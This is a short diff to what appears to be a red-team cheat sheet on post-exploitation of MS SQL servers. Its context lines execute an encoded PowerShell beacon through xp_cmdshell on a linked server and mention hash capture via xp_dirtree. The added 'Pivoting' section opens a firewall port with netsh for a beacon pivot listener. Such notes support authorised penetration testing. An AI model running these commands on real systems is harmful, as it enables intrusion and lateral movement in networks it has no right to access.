@@ -117,3 +117,12 @@ NetNTLMv2 via xp_dirtree (Inveigh on Host in target network, or smbserver on Kal
 Query to execute beacon on the instance directly:
 
 > SELECT * FROM OPENQUERY("[targetserver]", 'select @@servername; exec xp_cmdshell ''powershell -enc [EncodedString]''');
+
+## Pivoting
+
+- Right click on running beacon -> pivoting
+- Create pivoting listener (example, port 4444)
+
+add firewall rule:
+  
+> beacon> run netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
